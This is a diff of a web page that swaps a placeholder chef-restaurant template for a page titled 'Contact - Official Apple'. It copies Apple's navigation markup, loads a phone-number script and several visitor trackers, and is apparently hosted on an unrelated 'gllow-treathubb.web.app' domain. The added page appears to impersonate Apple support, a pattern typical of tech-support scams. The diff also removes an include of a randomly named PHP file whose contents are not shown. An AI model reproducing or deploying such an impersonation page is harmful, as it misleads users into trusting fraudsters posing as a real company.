@@ -1,12 +1,8 @@
-<?php require __DIR__ . '/1czbpxh.php' ?>
-<!DOCTYPE html>
-<html lang="en">
-
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-     <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+      <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5036783,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5036817,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -14,859 +10,374 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5036783&101" alt="free counter statistics" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5036817&101" alt="hit tracker" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-    <meta charset="utf-8">
-    <title>CHEFER - Chef Website Template</title>
-    <meta content="width=device-width, initial-scale=1.0" name="viewport">
-    <meta content="Free HTML Templates" name="keywords">
-    <meta content="Free HTML Templates" name="description">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Y4P7Z94B0G"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-    <!-- Favicon -->
-    <link href="img/favicon.ico" rel="icon">
+  gtag('config', 'G-Y4P7Z94B0G');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-    <!-- Google Web Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Emblema+One&family=Poppins:wght@400;600&display=swap"
-        rel="stylesheet">
-
-    <!-- Icon Font Stylesheet -->
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.0/css/all.min.css" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
-
-    <!-- Libraries Stylesheet -->
-    <link href="lib/animate/animate.min.css" rel="stylesheet">
-    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
-
-    <!-- Customized Bootstrap Stylesheet -->
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-
-    <!-- Template Stylesheet -->
-    <link href="css/style.css" rel="stylesheet">
 </head>
 
 <body>
-    <!-- Spinner Start -->
-    <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
-        <div class="spinner-border text-primary" role="status" style="width: 3rem; height: 3rem;"></div>
-    </div>
-    <!-- Spinner End -->
-
-
-    <!-- Header Start -->
-    <div class="container-fluid bg-dark px-0">
-        <div class="row gx-0 wow fadeIn" data-wow-delay="0.1s">
-            <div class="col-lg-3 bg-primary d-none d-lg-block">
-                <a href="index.html"
-                    class="navbar-brand w-100 h-100 m-0 p-0 d-flex align-items-center justify-content-center">
-                    <h1 class="m-0 display-4 text-white text-uppercase">Chefer</h1>
-                </a>
-            </div>
-            <div class="col-lg-9">
-                <div class="row gx-0 d-none d-lg-flex bg-dark">
-                    <div class="col-6 px-5 text-start">
-                        <div class="h-100 d-inline-flex align-items-center py-2 me-4">
-                            <i class="fa fa-envelope text-primary me-2"></i>
-                            <p class="mb-0">info@example.com</p>
-                        </div>
-                    </div>
-                    <div class="col-6 px-5 text-end">    
-                        <div class="h-100 d-inline-flex align-items-center py-2">
-                            <i class="fa fa-phone-alt text-primary me-2"></i>
-                            <p class="mb-0">+012 345 6789</p>
-                        </div>
-                    </div>
-                </div>
-                <nav class="navbar navbar-expand-lg navbar-dark p-3 p-lg-0 px-lg-5" style="background: #111111;">
-                    <a href="index.html" class="navbar-brand d-block d-lg-none">
-                        <h1 class="m-0 display-4 text-primary text-uppercase">Chefer</h1>
-                    </a>
-                    <button type="button" class="navbar-toggler" data-bs-toggle="collapse"
-                        data-bs-target="#navbarCollapse">
-                        <span class="navbar-toggler-icon"></span>
-                    </button>
-                    <div class="collapse navbar-collapse justify-content-between" id="navbarCollapse">
-                        <div class="navbar-nav mr-auto py-0">
-                            <a href="index.html" class="nav-item nav-link active">Home</a>
-                            <a href="about.html" class="nav-item nav-link">About</a>
-                            <a href="menu.html" class="nav-item nav-link">Menu</a>
-                            <a href="team.html" class="nav-item nav-link">Chefs</a>
-                            <div class="nav-item dropdown">
-                                <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">Pages</a>
-                                <div class="dropdown-menu rounded-0 m-0">
-                                    <a href="feature.html" class="dropdown-item">Features</a>
-                                    <a href="blog.html" class="dropdown-item">Blog Post</a>
-                                    <a href="testimonial.html" class="dropdown-item">Testimonial</a>
-                                    <a href="404.html" class="dropdown-item">404 Error</a>
-                                </div>
-                            </div>
-                            <a href="contact.html" class="nav-item nav-link">Contact</a>
-                        </div>
-                        <div class="d-none d-lg-flex align-items-center py-2">
-                            <a class="btn btn-outline-secondary btn-square rounded-circle ms-2" href="">
-                                <i class="fab fa-facebook-f"></i>
-                            </a>
-                            <a class="btn btn-outline-secondary btn-square rounded-circle ms-2" href="">
-                                <i class="fab fa-twitter"></i>
-                            </a>
-                            <a class="btn btn-outline-secondary btn-square rounded-circle ms-2" href="">
-                                <i class="fab fa-linkedin-in"></i>
-                            </a>
-                        </div>
-                    </div>
-                </nav>
-            </div>
-        </div>
-    </div>
-    <!-- Header End -->
-
-
-    <!-- Hero Start -->
-    <div class="container-fluid p-5 mb-5 bg-dark text-secondary">
-        <div class="row g-5 py-5">
-            <div class="col-12 wow fadeIn" data-wow-delay="0.1s">
-                <h1 class="display-1 text-secondary text-center mb-0">John Doe</h1>
-            </div>
-            <div class="col-lg-4 wow fadeIn" data-wow-delay="0.1s">
-                <img class="img-fluid rounded mb-3" src="img/hero-2.jpg">
-                <p>
-                    <i class="bi bi-arrow-down animate-up-down" style="font-size: 3rem;"></i>
-                </p>
-                <p class="mb-0">
-                    Diam dolor diam ipsum et, tempor voluptua sit consetetur sit. Aliquyam diam amet diam et eos
-                    sadipscing labore. Clita erat ipsum et lorem et sit, sed stet no labore lorem sit. Sanctus clita duo
-                    justo et tempor consetetur takimata eirmod.
-                </p>
-            </div>
-            <div class="col-lg-4 wow fadeIn" data-wow-delay="0.3s" style="min-height: 500px;">
-                <div class="position-relative h-100">
-                    <img class="position-absolute w-100 h-100 rounded" src="img/hero-1.jpg" style="object-fit: cover;">
-                </div>
-            </div>
-            <div class="col-lg-4 wow fadeIn" data-wow-delay="0.5s">
-                <p>
-                    Diam dolor diam ipsum et, tempor voluptua sit consetetur sit. Aliquyam diam amet diam et eos
-                    sadipscing labore. Clita erat ipsum et lorem et sit, sed stet no labore lorem sit. Sanctus clita duo
-                    justo et tempor consetetur takimata eirmod.
-                </p>
-                <p>
-                    <i class="bi bi-arrow-up animate-up-down" style="font-size: 3rem;"></i>
-                </p>
-                <img class="img-fluid rounded" src="img/hero-3.jpg">
-            </div>
-        </div>
-    </div>
-    <!-- Hero End -->
-
-
-    <!-- About Start -->
-    <div class="container-fluid p-5">
-        <div class="row gx-5">
-            <div class="col-lg-5 mb-5 mb-lg-0 wow fadeIn" data-wow-delay="0.1s" style="min-height: 500px;">
-                <div class="position-relative h-100">
-                    <div class="position-absolute top-0 start-0 animate-rotate"
-                        style="width: 160px; height: 160px;">
-                        <img class="img-fluid" src="img/about-round.jpg" alt="">
-                    </div>
-                    <img class="position-absolute w-100 h-100 rounded-circle rounded-bottom rounded-end"
-                        src="img/about.jpg" style="object-fit: cover;">
-                </div>
-            </div>
-            <div class="col-lg-7">
-                <div class="mb-4 wow fadeIn" data-wow-delay="0.2s">
-                    <h5 class="section-title">About Us</h5>
-                    <h1 class="display-3 mb-0">Cooking Together With The Expert</h1>
-                </div>
-                <p class="mb-4 wow fadeIn" data-wow-delay="0.3s">Nonumy erat diam duo labore clita. Sit magna ipsum dolor sed ea duo at ut. Tempor sit
-                    lorem sit magna ipsum duo. Sit eos dolor ut sea rebum, diam sea rebum lorem kasd ut ipsum dolor est
-                    ipsum. Et stet amet justo amet clita erat, ipsum sed at ipsum eirmod labore lorem.</p>
-                <div class="row">
-                    <div class="col-sm-6 wow fadeIn" data-wow-delay="0.4s">
-                        <div class="bg-light rounded p-4">
-                            <img class="img-fluid bg-primary rounded-circle mb-3" src="img/feature-1.png" style="width: 80px; height: 80px;">
-                            <h4>Master Chefs</h4>
-                            <p class="mb-0">Tempor erat elitr at rebum at at clita aliquyam consetetur. Diam dolor diam
-                                ipsum et, tempor voluptua sit consetetur sit. Aliquyam diam amet diam et eos sadipscing
-                                labore.</p>
-                        </div>
-                    </div>
-                    <div class="col-sm-6 wow fadeIn" data-wow-delay="0.5s">
-                        <div class="bg-light rounded p-4">
-                            <img class="img-fluid bg-primary rounded-circle mb-3" src="img/feature-3.png" style="width: 80px; height: 80px;">
-                            <h4>Quality Food</h4>
-                            <p class="mb-0">Tempor erat elitr at rebum at at clita aliquyam consetetur. Diam dolor diam
-                                ipsum et, tempor voluptua sit consetetur sit. Aliquyam diam amet diam et eos sadipscing
-                                labore.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- About End -->
-
-
-    <!-- Facts Start -->
-    <div class="container-fluid bg-dark facts p-5 my-5">
-        <div class="row gx-5 gy-4 py-5">
-            <div class="col-lg-3 col-md-6 wow fadeIn" data-wow-delay="0.1s">
-                <div class="d-flex">
-                    <div class="rounded-circle d-flex align-items-center justify-content-center mb-3"
-                        style="width: 80px; height: 80px; background: #111111;">
-                        <i class="fa fa-star fs-4 text-primary"></i>
-                    </div>
-                    <div class="ps-4">
-                        <h5 class="text-white">Years</h5>
-                        <h1 class="display-5 text-secondary mb-0" data-toggle="counter-up">1234</h1>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-3 col-md-6 wow fadeIn" data-wow-delay="0.2s">
-                <div class="d-flex">
-                    <div class="rounded-circle d-flex align-items-center justify-content-center mb-3"
-                        style="width: 80px; height: 80px; background: #111111;">
-                        <i class="fa fa-users fs-4 text-primary"></i>
-                    </div>
-                    <div class="ps-4">
-                        <h5 class="text-white">Clients</h5>
-                        <h1 class="display-5 text-secondary mb-0" data-toggle="counter-up">1234</h1>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-3 col-md-6 wow fadeIn" data-wow-delay="0.3s">
-                <div class="d-flex">
-                    <div class="rounded-circle d-flex align-items-center justify-content-center mb-3"
-                        style="width: 80px; height: 80px; background: #111111;">
-                        <i class="fa fa-check fs-4 text-primary"></i>
-                    </div>
-                    <div class="ps-4">
-                        <h5 class="text-white">Awards</h5>
-                        <h1 class="display-5 text-secondary mb-0" data-toggle="counter-up">1234</h1>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-3 col-md-6 wow fadeIn" data-wow-delay="0.4s">
-                <div class="d-flex">
-                    <div class="rounded-circle d-flex align-items-center justify-content-center mb-3"
-                        style="width: 80px; height: 80px; background: #111111;">
-                        <i class="fa fa-mug-hot fs-4 text-primary"></i>
-                    </div>
-                    <div class="ps-4">
-                        <h5 class="text-white">Events</h5>
-                        <h1 class="display-5 text-secondary mb-0" data-toggle="counter-up">1234</h1>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Facts End -->
-
-
-    <!-- Feature Start -->
-    <div class="container-fluid feature position-relative p-5 pb-0 mt-5">
-        <div class="row g-5 gb-5">
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.1s">
-                <div class="feature-item rounded text-center p-5">
-                    <img class="img-fluid bg-white rounded-circle" src="img/feature-1.png" style="width: 150px; height: 150px;">
-                    <h3 class="my-4">Best Chef</h3>
-                    <p class="text-light">Sed amet tempor amet sit kasd sea lorem dolor ipsum elitr dolor amet kasd
-                        elitr duo vero amet amet stet</p>
-                    <a class="font-body" style="letter-spacing: 1px;" href="">Read More <i
-                            class="bi bi-arrow-right"></i></a>
-                </div>
-            </div>
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.3s">
-                <div class="feature-item rounded text-center p-5">
-                    <img class="img-fluid bg-white rounded-circle" src="img/feature-2.png" style="width: 150px; height: 150px;">
-                    <h3 class="my-4">Menu Variations</h3>
-                    <p class="text-light">Sed amet tempor amet sit kasd sea lorem dolor ipsum elitr dolor amet kasd
-                        elitr duo vero amet amet stet</p>
-                    <a class="font-body" style="letter-spacing: 1px;" href="">Read More <i
-                            class="bi bi-arrow-right"></i></a>
-                </div>
-            </div>
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.5s">
-                <div class="feature-item rounded text-center p-5">
-                    <img class="img-fluid bg-white rounded-circle" src="img/feature-3.png" style="width: 150px; height: 150px;">
-                    <h3 class="my-4">Healthy Food</h3>
-                    <p class="text-light">Sed amet tempor amet sit kasd sea lorem dolor ipsum elitr dolor amet kasd
-                        elitr duo vero amet amet stet</p>
-                    <a class="font-body" style="letter-spacing: 1px;" href="">Read More <i
-                            class="bi bi-arrow-right"></i></a>
-                </div>
-            </div>
-            <div class="col-lg-12 col-md-6 text-center wow fadeIn" data-wow-delay="0.1s">
-                <h1 class="display-4 text-secondary mb-4"><span class="text-primary">30% Discount</span><br> For This Summer</h1>
-                <a href="" class="btn btn-primary py-3 px-5">Order Now</a>
-            </div>
-        </div>
-    </div>
-    <!-- Feature End -->
-
-
-    <!-- Menu Start -->
-    <div class="container-fluid menu py-5 px-0">
-        <div class="mb-5 text-center wow fadeIn" data-wow-delay="0.1s" style="max-width: 700px; margin: auto;">
-            <h5 class="section-title">Our Menu</h5>
-            <h1 class="display-3 mb-0">Hands Craft More Than Meals</h1>
-        </div>
-        <div class="tab-class text-center">
-            <ul class="nav nav-pills d-inline-flex justify-content-center bg-dark text-uppercase rounded-pill mb-5 wow fadeIn" data-wow-delay="0.2s">
-                <li class="nav-item">
-                    <a class="nav-link rounded-pill text-white active" data-bs-toggle="pill" href="#tab-1">Breakfast</a>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
                 </li>
-                <li class="nav-item">
-                    <a class="nav-link rounded-pill text-white" data-bs-toggle="pill" href="#tab-2">Launch</a>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
                 </li>
-                <li class="nav-item">
-                    <a class="nav-link rounded-pill text-white" data-bs-toggle="pill" href="#tab-3">Dinner</a>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                 </li>
             </ul>
-            <div class="tab-content">
-                <div id="tab-1" class="tab-pane fade show p-0 active">
-                    <div class="row g-0">
-                        <div class="col-lg-3 col-md-4 col-sm-6 wow fadeIn" data-wow-delay="0.1s">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-1.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6 wow fadeIn" data-wow-delay="0.2s">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-2.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6 wow fadeIn" data-wow-delay="0.3s">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-3.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6 wow fadeIn" data-wow-delay="0.4s">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-4.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6 wow fadeIn" data-wow-delay="0.5s">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-5.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6 wow fadeIn" data-wow-delay="0.6s">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-6.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6 wow fadeIn" data-wow-delay="0.7s">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-7.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6 wow fadeIn" data-wow-delay="0.8s">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-8.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div id="tab-2" class="tab-pane fade p-0">
-                    <div class="row g-0">
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-2.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-3.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-4.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-5.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-6.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-7.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-8.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-1.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div id="tab-3" class="tab-pane fade p-0">
-                    <div class="row g-0">
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-3.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-4.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-5.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-6.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-7.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-8.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-1.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-md-4 col-sm-6">
-                            <div class="position-relative">
-                                <img class="img-fluid" src="img/menu-2.jpg" alt="">
-                                <div
-                                    class="position-absolute bottom-0 end-0 mb-4 me-4 py-1 px-3 bg-dark rounded-pill text-primary">
-                                    BBQ Chicken</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Menu End -->
-
-
-    <!-- Team Start -->
-    <div class="container-fluid p-5">
-        <div class="mb-5 text-center wow fadeIn" data-wow-delay="0.1s" style="max-width: 700px; margin: auto;">
-            <h5 class="section-title">Expert Chefs</h5>
-            <h1 class="display-3 mb-0">Let's Meet The Expert</h1>
-        </div>
-        <div class="row g-5">
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.1s">
-                <div class="team-item position-relative">
-                    <div class="position-relative overflow-hidden rounded-circle rounded-bottom rounded-end">
-                        <img class="img-fluid w-100" src="img/team-1.jpg" alt="">
-                        <div class="team-overlay">
-                            <div class="d-flex align-items-center justify-content-start">
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-twitter"></i></a>
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-facebook-f"></i></a>
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-linkedin-in"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="position-absolute start-0 bottom-0 d-flex flex-column justify-content-center w-100 rounded-bottom text-center"
-                        style="height: 100px; background: rgba(34, 36, 41, .9);">
-                        <h5 class="text-light">John Deo</h5>
-                        <p class="small text-uppercase text-secondary m-0" style="letter-spacing: 3px;">Master Chef</p>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.3s">
-                <div class="team-item position-relative">
-                    <div class="position-relative overflow-hidden rounded-circle rounded-bottom rounded-end">
-                        <img class="img-fluid w-100" src="img/team-2.jpg" alt="">
-                        <div class="team-overlay">
-                            <div class="d-flex align-items-center justify-content-start">
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-twitter"></i></a>
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-facebook-f"></i></a>
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-linkedin-in"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="position-absolute start-0 bottom-0 d-flex flex-column justify-content-center w-100 rounded-bottom text-center"
-                        style="height: 100px; background: rgba(34, 36, 41, .9);">
-                        <h5 class="text-light">John Deo</h5>
-                        <p class="small text-uppercase text-secondary m-0" style="letter-spacing: 3px;">Assistant</p>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-4 col-md-6 wow fadeIn" data-wow-delay="0.5s">
-                <div class="team-item position-relative">
-                    <div class="position-relative overflow-hidden rounded-circle rounded-bottom rounded-end">
-                        <img class="img-fluid w-100" src="img/team-3.jpg" alt="">
-                        <div class="team-overlay">
-                            <div class="d-flex align-items-center justify-content-start">
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-twitter"></i></a>
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-facebook-f"></i></a>
-                                <a class="btn btn-light btn-square rounded-circle mx-1" href="#"><i
-                                        class="fab fa-linkedin-in"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="position-absolute start-0 bottom-0 d-flex flex-column justify-content-center w-100 rounded-bottom text-center"
-                        style="height: 100px; background: rgba(34, 36, 41, .9);">
-                        <h5 class="text-light">John Deo</h5>
-                        <p class="small text-uppercase text-secondary m-0" style="letter-spacing: 3px;">Assistant</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Team End -->
-
-
-    <!-- Testimonial Start -->
-    <div class="container-fluid p-0 my-5">
-        <div class="row g-0">
-            <div class="col-lg-6 wow fadeIn" data-wow-delay="0.1s" style="min-height: 500px;">
-                <div class="h-100 position-relative overflow-hidden" style="border-top-left-radius: 50%;">
-                    <img class="position-absolute w-100 h-100" src="img/testimonial.jpg" style="object-fit: cover;">
-                </div>
-            </div>
-            <div class="col-lg-6 bg-dark p-5 overflow-hidden wow fadeIn" data-wow-delay="0.3s" style="border-bottom-right-radius: 50%;">
-                <div class="mb-5">
-                    <h5 class="section-title">Testimonial</h5>
-                    <h1 class="display-3 text-secondary mb-0">Our Client Say</h1>
-                </div>
-                <div class="owl-carousel testimonial-carousel">
-                    <div class="testimonial-item">
